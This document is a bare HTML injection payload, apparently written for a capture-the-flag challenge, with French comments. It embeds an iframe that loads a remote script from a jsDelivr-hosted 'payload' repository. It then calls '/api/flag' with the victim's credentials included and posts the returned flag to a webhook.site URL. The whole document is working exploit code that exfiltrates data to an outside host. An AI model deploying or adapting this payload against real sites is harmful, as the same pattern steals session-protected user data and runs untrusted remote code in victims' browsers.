<iframe srcdoc="
    <script src='https://cdn.jsdelivr.net/gh/rolandtek/payload@main/lol.js'></script>
    <script>
        fetch('/api/flag', {
            method: 'GET',
            credentials: 'include',
        })
        .then(response => response.json())
        .then(data => {
            // Envoie le flag à ton webhook
            fetch('https://webhook.site/2e771e56-2d9f-482a-91af-24b27aa9fb2c', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ flag: data.flag })
            })
            .then(res => res.json())
            .then(resData => {
                console.log('Webhook response:', resData);
            })
            .catch(error => {
                console.error('Erreur lors de l\'envoi au webhook:', error);
            });
        })
        .catch(error => {
            console.error('Erreur lors de la récupération du flag:', error);
        });
    </script>
"></iframe>
